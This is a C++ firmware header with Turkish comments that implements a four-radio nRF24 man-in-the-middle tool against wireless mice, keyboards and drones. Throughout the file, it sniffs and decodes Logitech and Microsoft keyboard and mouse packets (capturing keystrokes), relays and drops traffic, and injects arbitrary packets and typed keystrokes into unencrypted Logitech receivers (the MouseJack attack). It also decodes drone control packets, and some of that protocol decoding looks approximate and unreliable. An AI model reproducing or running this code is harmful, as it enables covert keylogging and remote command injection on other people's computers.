#pragma once
// ═══════════════════════════════════════════════════════════
//  mod_mitm.h — Gelişmiş nRF24 MITM
//
//  Pasif MITM:
//    nRF24 #1 → hedef cihazı (mouse/klavye/drone) dinler
//    nRF24 #2 → alıcıyı (dongle/kontrol ünitesi) dinler
//    Her iki yönden paketleri yakalar, decode eder, loglar
//
//  Aktif MITM (Relay):
//    nRF24 #1 → hedefi dinler
//    nRF24 #2 → paketi (modifiye edilmiş) alıcıya iletir
//    nRF24 #3 → alıcıyı dinler
//    nRF24 #4 → cevabı hedefe iletir
//    DevKitC'den "INJ:AABBCC..." komutu ile paket enjeksiyonu
//
//  Protokol Desteği:
//    Logitech Unifying (ESB) — tuş/fare decode
//    Microsoft kablosuz     — HID decode
//    Genel nRF24 ESB        — ham paket
//    Drone telemetri        — komut decode
//
//  MouseJack Saldırısı:
//    Logitech/Microsoft şifreli olmayan protokoller
//    Keystroke injection (sahte tuş basımı)
//    Mouse hareket enjeksiyonu
// ═══════════════════════════════════════════════════════════

#include <RF24.h>
#include "pin_config.h"

extern RF24 jam1, jam2, jam3, jam4;

// ── Protokol adresleri ────────────────────────────────────
// Logitech Unifying ESB adresleri (broadcast sniff)
static const uint8_t LOGI_ADDR_SNIFF[5]  = { 0x00, 0x00, 0x00, 0x00, 0x00 };
static const uint8_t LOGI_ADDR_PAIR[5]   = { 0xBB, 0x0A, 0xDC, 0xA5, 0x75 };
// Microsoft kablosuz
static const uint8_t MS_ADDR_SNIFF[5]    = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
// Generic broadcast
static const uint8_t GENERIC_ADDR[5]     = { 0xE7, 0xE7, 0xE7, 0xE7, 0xE7 };

// Logitech kanalları (1 MHz aralıklı, 2402-2480 MHz)
static const uint8_t LOGI_CHANNELS[] = {
    5,  8, 11, 14, 17, 20, 23, 26, 29, 32,
   35, 38, 41, 44, 47, 50, 53, 56, 59, 62,
   65, 68, 71, 74
};
static constexpr uint8_t LOGI_CH_CNT = 24;

// Microsoft kanalları
static const uint8_t MS_CHANNELS[] = { 2, 25, 50, 75, 100 };
static constexpr uint8_t MS_CH_CNT = 5;

// ── Paket log yapısı ──────────────────────────────────────
struct MitmPkt {
    uint8_t  data[32];
    uint8_t  len;
    uint8_t  channel;
    uint8_t  direction;  // 0=hedef→alıcı, 1=alıcı→hedef
    uint32_t timestamp;
    char     protocol[12];
    char     decoded[48]; // human-readable decode
};

static MitmPkt  g_mitmPkts[64];
static uint8_t  g_mitmHead  = 0;
static uint16_t g_mitmTotal = 0;

// ── Yardımcı: hex string ─────────────────────────────────
static String pktToHex(const uint8_t* d, uint8_t len, uint8_t maxBytes = 32) {
    String s = "";
    for (uint8_t i = 0; i < min((int)len, (int)maxBytes); i++) {
        if (d[i] < 0x10) s += "0";
        s += String(d[i], HEX);
    }
    return s;
}

// ── Logitech paket decode ─────────────────────────────────
static String decodeLogitech(const uint8_t* pkt, uint8_t len) {
    if (len < 3) return "SHORT_PKT";

    uint8_t type = pkt[0];

    // Logitech paket tipleri
    switch (type) {
        case 0x00:
            if (len >= 8) {
                // HID klavye raporu
                uint8_t mod = pkt[1];  // modifier keys
                uint8_t key = pkt[3];  // keycode
                String s = "KEYBD:mod=";
                if (mod & 0x01) s += "LCTRL+";
                if (mod & 0x02) s += "LSHIFT+";
                if (mod & 0x04) s += "LALT+";
                if (mod & 0x08) s += "LMETA+";
                if (mod & 0x10) s += "RCTRL+";
                if (mod & 0x20) s += "RSHIFT+";
                if (mod & 0x40) s += "RALT+";
                if (mod & 0x80) s += "RMETA+";
                s += "key=0x" + String(key, HEX);
                return s;
            }
            break;

        case 0xC1:
            // Şifreli klavye (Logitech Advanced Encryption)
            return "ENC_KEY:aes_encrypted";

        case 0x40:
            if (len >= 7) {
                // HID mouse raporu
                int8_t dx = (int8_t)pkt[2];
                int8_t dy = (int8_t)pkt[3];
                uint8_t btn = pkt[1];
                String s = "MOUSE:";
                if (btn & 0x01) s += "L";
                if (btn & 0x02) s += "R";
                if (btn & 0x04) s += "M";
                s += " dx=" + String(dx) + " dy=" + String(dy);
                if (len >= 8) s += " wheel=" + String((int8_t)pkt[5]);
                return s;
            }
            break;

        case 0x4F:
            return "KEEPALIVE";

        case 0x0F:
            return "HIDPP:report";

        case 0x10:
            return "HIDPP:short";

        case 0x11:
            return "HIDPP:long";

        case 0xBF:
            return "UNPAIR_REQ";

        case 0x1F:
            if (len >= 10) {
                return "PAIR:step=" + String(pkt[1]) +
                       " dev=" + String(pkt[3], HEX);
            }
            break;

        case 0xFF:
            return "WAKE_UP";
    }
    return "UNKNOWN:type=0x" + String(type, HEX);
}

// ── Microsoft HID decode ─────────────────────────────────
static String decodeMicrosoft(const uint8_t* pkt, uint8_t len) {
    if (len < 4) return "SHORT_PKT";

    // MS protokolü farklı format kullanır
    if (pkt[0] == 0x38 && len >= 8) {
        // Mouse raporu
        int8_t dx = (int8_t)pkt[3];
        int8_t dy = (int8_t)pkt[4];
        return "MS_MOUSE:dx=" + String(dx) + " dy=" + String(dy);
    }
    if (pkt[0] == 0x78 && len >= 8) {
        // Klavye raporu
        return "MS_KEY:0x" + String(pkt[2], HEX) + String(pkt[3], HEX);
    }
    return "MS_UNKNOWN:0x" + String(pkt[0], HEX);
}

// ── Drone komut decode ───────────────────────────────────
static String decodeDrone(const uint8_t* pkt, uint8_t len, uint8_t ch) {
    if (len < 6) return "SHORT_PKT";

    // DJI komut paketi imzası
    if ((pkt[0] == 0x55 || pkt[0] == 0xAA) && ch < 84) {
        uint8_t cmd = pkt[2];
        switch (cmd) {
            case 0x01: return "DJI:THROTTLE=" + String(pkt[3]);
            case 0x02: return "DJI:PITCH=" + String((int8_t)pkt[3]);
            case 0x03: return "DJI:ROLL=" + String((int8_t)pkt[3]);
            case 0x04: return "DJI:YAW=" + String((int8_t)pkt[3]);
            case 0x10: return "DJI:TAKEOFF";
            case 0x11: return "DJI:LAND";
            case 0x12: return "DJI:EMERGENCY_STOP";
            case 0x20: return "DJI:RETURN_HOME";
            default:
                return "DJI:CMD=0x" + String(cmd, HEX) +
                       " data=" + pktToHex(&pkt[3], min((int)len-3, 4));
        }
    }

    // Syma komut paketi
    if (pkt[0] == 0xA2 && ch >= 40 && ch <= 76) {
        int8_t throt = pkt[1];
        int8_t yaw   = (int8_t)pkt[2];
        int8_t pitch = (int8_t)pkt[3];
        int8_t roll  = (int8_t)pkt[4];
        return "SYMA:T=" + String(throt) +
               " Y=" + String(yaw) +
               " P=" + String(pitch) +
               " R=" + String(roll);
    }

    // FrSky
    if (pkt[0] == 0x7E) {
        return "FRSKY:CH=" + String(ch) +
               " len=" + String(len);
    }

    return "DRONE:raw=" + pktToHex(pkt, min((int)len, 6));
}

// ── Paket log ─────────────────────────────────────────────
static void logPkt(const uint8_t* data, uint8_t len, uint8_t ch,
                   uint8_t dir, const char* proto, const String& decoded) {
    MitmPkt& p = g_mitmPkts[g_mitmHead];
    memcpy(p.data, data, len);
    p.len       = len;
    p.channel   = ch;
    p.direction = dir;
    p.timestamp = millis();
    strncpy(p.protocol, proto, 11);
    strncpy(p.decoded, decoded.c_str(), 47);
    g_mitmHead = (g_mitmHead + 1) % 64;
    g_mitmTotal++;

    // UART'a gönder
    String msg = "MITM:";
    msg += (dir == 0) ? "D>" : "<R";
    msg += ":" + String(proto) + ":" + String(ch) + ":";
    msg += pktToHex(data, min((int)len, 16)) + ":";
    msg += decoded + "\n";
    bleUartSend(msg);
}

// ── Logitech kanal bul ────────────────────────────────────
static int8_t findLogiChannel(RF24* r) {
    r->setDataRate(RF24_1MBPS);
    r->setAddressWidth(5);
    r->openReadingPipe(1, LOGI_ADDR_PAIR);

    for (uint8_t attempt = 0; attempt < 3; attempt++) {
        for (uint8_t i = 0; i < LOGI_CH_CNT; i++) {
            r->setChannel(LOGI_CHANNELS[i]);
            r->startListening();
            delay(3);
            if (r->testRPD() || r->available()) {
                r->stopListening();
                return LOGI_CHANNELS[i];
            }
            r->stopListening();
        }
    }
    return -1;  // bulunamadı
}

// ── MouseJack: Keystroke Injection ───────────────────────
// Logitech şifreli olmayan protokollerde sahte tuş basımı
static void mousejackInject(RF24* r, uint8_t ch,
                            const char* keys, uint8_t devIdx = 0) {
    // Unencrypted HID keyboard report
    // Logitech format: [type=0x00][modifier][0x00][keycode][0x00][0x00][0x00][0x00]
    uint8_t pkt[8] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

    r->stopListening();
    r->setDataRate(RF24_1MBPS);
    r->setAddressWidth(5);
    r->openWritingPipe(LOGI_ADDR_PAIR);
    r->setChannel(ch);
    r->setCRCLength(RF24_CRC_16);
    r->setAutoAck(true);
    r->setPayloadSize(8);

    // ASCII → HID keycode tablosu (basit)
    auto asciiToHid = [](char c, uint8_t& mod, uint8_t& key) {
        mod = 0;
        if (c >= 'a' && c <= 'z') { key = c - 'a' + 0x04; return; }
        if (c >= 'A' && c <= 'Z') { mod = 0x02; key = c - 'A' + 0x04; return; }
        if (c >= '1' && c <= '9') { key = c - '1' + 0x1E; return; }
        switch (c) {
            case '0': key = 0x27; break;
            case ' ': key = 0x2C; break;
            case '\n': key = 0x28; break;
            case '.': key = 0x37; break;
            case '-': key = 0x2D; break;
            case '/': key = 0x38; break;
            default: key = 0x00; break;
        }
    };

    for (uint8_t i = 0; keys[i] != '\0'; i++) {
        uint8_t mod = 0, key = 0;
        asciiToHid(keys[i], mod, key);
        if (key == 0) continue;

        // Key press
        pkt[1] = mod; pkt[3] = key;
        r->writeFast(pkt, 8, true);
        r->txStandBy();
        delay(5);

        // Key release
        pkt[1] = 0; pkt[3] = 0;
        r->writeFast(pkt, 8, true);
        r->txStandBy();
        delay(5);
    }

    // Orijinal ayarlara dön
    r->setAutoAck(false);
    r->setCRCLength(RF24_CRC_DISABLED);
    r->setPayloadSize(32);
    bleUartSend("MITM:INJ:OK:" + String(strlen(keys)) + "chars\n");
}

// ── Pasif MITM ────────────────────────────────────────────
static void mitmPassive() {
    SPI.begin(PIN_SCK, PIN_MISO, PIN_MOSI);

    bleUartSend("MITM:P:INIT\n");

    // #1 ile Logitech kanalı bul
    jam1.begin(&SPI);
    jam1.setPALevel(NRF_PA_LEVEL);
    int8_t logiCh = findLogiChannel(&jam1);

    uint8_t ch1 = (logiCh >= 0) ? (uint8_t)logiCh : 50;
    uint8_t ch2 = (ch1 + 3 < 126) ? ch1 + 3 : ch1;

    bleUartSend("MITM:P:LOGI_CH=" + String(ch1) + "\n");

    // #1: hedef cihaz dinle (1Mbps, Logi addr)
    jam1.setDataRate(RF24_1MBPS);
    jam1.setAddressWidth(5);
    jam1.setChannel(ch1);
    jam1.openReadingPipe(0, LOGI_ADDR_SNIFF);
    jam1.openReadingPipe(1, LOGI_ADDR_PAIR);
    jam1.setCRCLength(RF24_CRC_DISABLED);
    jam1.startListening();

    // #2: alıcı dongle dinle
    jam2.begin(&SPI);
    jam2.setPALevel(NRF_PA_LEVEL);
    jam2.setDataRate(RF24_1MBPS);
    jam2.setAddressWidth(5);
    jam2.setChannel(ch2);
    jam2.openReadingPipe(0, LOGI_ADDR_SNIFF);
    jam2.openReadingPipe(1, LOGI_ADDR_PAIR);
    jam2.setCRCLength(RF24_CRC_DISABLED);
    jam2.startListening();

    // #3: MS kanalları
    jam3.begin(&SPI);
    jam3.setPALevel(NRF_PA_LEVEL);
    jam3.setDataRate(RF24_1MBPS);
    jam3.setAddressWidth(5);
    jam3.setChannel(MS_CHANNELS[0]);
    jam3.openReadingPipe(0, MS_ADDR_SNIFF);
    jam3.setCRCLength(RF24_CRC_DISABLED);
    jam3.startListening();

    // #4: Drone frekansları
    jam4.begin(&SPI);
    jam4.setPALevel(NRF_PA_LEVEL);
    jam4.setDataRate(RF24_2MBPS);
    jam4.setAddressWidth(5);
    jam4.setChannel(36);
    jam4.openReadingPipe(0, GENERIC_ADDR);
    jam4.setCRCLength(RF24_CRC_DISABLED);
    jam4.startListening();

    bleUartSend("MITM:P:LISTEN\n");

    uint8_t pkt[32];
    uint8_t msChIdx  = 0;
    uint8_t droneChIdx = 0;
    uint32_t lastRotate = 0;

    while (true) {
        // #1 — Logitech hedef
        if (jam1.available()) {
            uint8_t len = jam1.getDynamicPayloadSize();
            if (len == 0 || len > 32) len = 8;
            jam1.read(pkt, len);
            String dec = decodeLogitech(pkt, len);
            logPkt(pkt, len, ch1, 0, "LOGI", dec);
        }

        // #2 — Logitech alıcı
        if (jam2.available()) {
            uint8_t len = jam2.getDynamicPayloadSize();
            if (len == 0 || len > 32) len = 8;
            jam2.read(pkt, len);
            String dec = decodeLogitech(pkt, len);
            logPkt(pkt, len, ch2, 1, "LOGI", dec);
        }

        // #3 — Microsoft
        if (jam3.available()) {
            uint8_t len = jam3.getDynamicPayloadSize();
            if (len == 0 || len > 32) len = 8;
            jam3.read(pkt, len);
            String dec = decodeMicrosoft(pkt, len);
            logPkt(pkt, len, MS_CHANNELS[msChIdx], 0, "MS", dec);
        }

        // #4 — Drone
        if (jam4.available()) {
            uint8_t ch = 36 + droneChIdx * 4;
            uint8_t len = jam4.getDynamicPayloadSize();
            if (len == 0 || len > 32) len = 12;
            jam4.read(pkt, len);
            String dec = decodeDrone(pkt, len, ch);
            logPkt(pkt, len, ch, 0, "DRONE", dec);
        }

        // Her 200ms'de kanal rotasyonu
        if (millis() - lastRotate > 200) {
            lastRotate = millis();
            msChIdx    = (msChIdx + 1) % MS_CH_CNT;
            droneChIdx = (droneChIdx + 1) % 12;

            jam3.stopListening();
            jam3.setChannel(MS_CHANNELS[msChIdx]);
            jam3.startListening();

            jam4.stopListening();
            jam4.setChannel(36 + droneChIdx * 4);
            jam4.startListening();
        }

        // Logitech kanal kayması takibi
        if (logiCh >= 0 && millis() % 5000 < 10) {
            int8_t newCh = findLogiChannel(&jam1);
            if (newCh >= 0 && newCh != ch1) {
                ch1 = newCh;
                ch2 = (ch1 + 3 < 126) ? ch1 + 3 : ch1;
                jam1.stopListening(); jam1.setChannel(ch1); jam1.startListening();
                jam2.stopListening(); jam2.setChannel(ch2); jam2.startListening();
                bleUartSend("MITM:P:CH_UPDATE=" + String(ch1) + "\n");
            }
        }

        String cmd = bleGetCmd();
        if (cmd == "STOP") break;

        // MouseJack injection: "INJ:Hello World\n"
        if (cmd.startsWith("INJ:")) {
            String keys = cmd.substring(4);
            mousejackInject(&jam1, ch1, keys.c_str());
        }

        vTaskDelay(1);
    }

    jam1.powerDown(); jam2.powerDown();
    jam3.powerDown(); jam4.powerDown();
    bleUartSend("MITM:P:STOP:TOT=" + String(g_mitmTotal) + "\n");
}

// ── Aktif MITM (4-modül relay) ────────────────────────────
static void mitmActive() {
    SPI.begin(PIN_SCK, PIN_MISO, PIN_MOSI);
    bleUartSend("MITM:A:INIT\n");

    // Kanal bul
    jam1.begin(&SPI);
    jam1.setPALevel(NRF_PA_LEVEL);
    int8_t logiCh = findLogiChannel(&jam1);
    uint8_t ch = (logiCh >= 0) ? (uint8_t)logiCh : 50;
    uint8_t chR = (ch + 3 < 126) ? ch + 3 : ch;

    bleUartSend("MITM:A:CH=" + String(ch) + "\n");

    auto initRelay = [](RF24* r, bool rx, uint8_t ach,
                        const uint8_t* addr) {
        r->setDataRate(RF24_1MBPS);
        r->setAddressWidth(5);
        r->setChannel(ach);
        r->setCRCLength(RF24_CRC_DISABLED);
        r->setAutoAck(false);
        r->setPayloadSize(32);
        if (rx) {
            r->openReadingPipe(0, addr);
            r->openReadingPipe(1, LOGI_ADDR_SNIFF);
            r->startListening();
        } else {
            r->openWritingPipe(addr);
            r->stopListening();
        }
    };

    // #1: hedef RX
    jam1.begin(&SPI); jam1.setPALevel(NRF_PA_LEVEL);
    initRelay(&jam1, true,  ch,  LOGI_ADDR_PAIR);
    // #2: alıcı TX (relay)
    jam2.begin(&SPI); jam2.setPALevel(NRF_PA_LEVEL);
    initRelay(&jam2, false, chR, LOGI_ADDR_PAIR);
    // #3: alıcı RX
    jam3.begin(&SPI); jam3.setPALevel(NRF_PA_LEVEL);
    initRelay(&jam3, true,  chR, LOGI_ADDR_PAIR);
    // #4: hedef TX (relay)
    jam4.begin(&SPI); jam4.setPALevel(NRF_PA_LEVEL);
    initRelay(&jam4, false, ch,  LOGI_ADDR_PAIR);

    bleUartSend("MITM:A:RELAY_ON\n");

    uint8_t pkt[32];
    uint32_t relayed  = 0;
    uint32_t dropped  = 0;
    uint32_t injected = 0;
    bool     dropNext = false;  // bir sonraki paketi düşür

    while (true) {
        // Hedef → alıcı relay
        if (jam1.available()) {
            uint8_t len = jam1.getPayloadSize();
            if (len > 32) len = 32;
            jam1.read(pkt, len);

            String dec = decodeLogitech(pkt, len);
            logPkt(pkt, len, ch, 0, "LOGI", dec);

            if (!dropNext) {
                // Paketi modifiye etmeden ilet
                jam2.stopListening();
                jam2.writeFast(pkt, len, true);
                jam2.txStandBy();
                jam2.startListening();
                relayed++;
            } else {
                dropped++;
                dropNext = false;
                bleUartSend("MITM:A:DROPPED\n");
            }
        }

        // Alıcı → hedef relay
        if (jam3.available()) {
            uint8_t len = jam3.getPayloadSize();
            if (len > 32) len = 32;
            jam3.read(pkt, len);
            logPkt(pkt, len, chR, 1, "LOGI", "ACK_PKT");

            jam4.stopListening();
            jam4.writeFast(pkt, len, true);
            jam4.txStandBy();
            jam4.startListening();
        }

        // DevKitC komutları
        String cmd = bleGetCmd();

        if (cmd == "STOP") break;

        // Paket enjeksiyonu: "INJ:AABBCCDD..."
        else if (cmd.startsWith("INJ:")) {
            String hexStr = cmd.substring(4);
            uint8_t injPkt[32]; uint8_t injLen = 0;
            for (uint8_t i = 0; i + 1 < hexStr.length() && injLen < 32; i += 2) {
                injPkt[injLen++] = (uint8_t)strtol(
                    hexStr.substring(i, i+2).c_str(), nullptr, 16);
            }
            jam2.stopListening();
            jam2.writeFast(injPkt, injLen, true);
            jam2.txStandBy();
            jam2.startListening();
            injected++;
            bleUartSend("MITM:A:INJ:OK:" + String(injLen) + "B\n");
        }

        // Tuş enjeksiyonu: "KEYS:Hello World"
        else if (cmd.startsWith("KEYS:")) {
            String keys = cmd.substring(5);
            mousejackInject(&jam2, chR, keys.c_str());
            injected++;
        }

        // Bir paketi düşür (DoS testi)
        else if (cmd == "DROP") {
            dropNext = true;
            bleUartSend("MITM:A:DROP_ARMED\n");
        }

        // İstatistik
        else if (cmd == "STAT") {
            bleUartSend("MITM:A:STAT:REL=" + String(relayed) +
                        ":INJ=" + String(injected) +
                        ":DROP=" + String(dropped) + "\n");
        }

        // Her 3 saniyede otomatik stat
        static uint32_t lastStat = 0;
        if (millis() - lastStat > 3000) {
            lastStat = millis();
            bleUartSend("MITM:A:STAT:REL=" + String(relayed) +
                        ":INJ=" + String(injected) +
                        ":DROP=" + String(dropped) + "\n");
        }

        vTaskDelay(1);
    }

    jam1.powerDown(); jam2.powerDown();
    jam3.powerDown(); jam4.powerDown();
    bleUartSend("MITM:A:STOP:REL=" + String(relayed) +
                ":INJ=" + String(injected) + "\n");
}
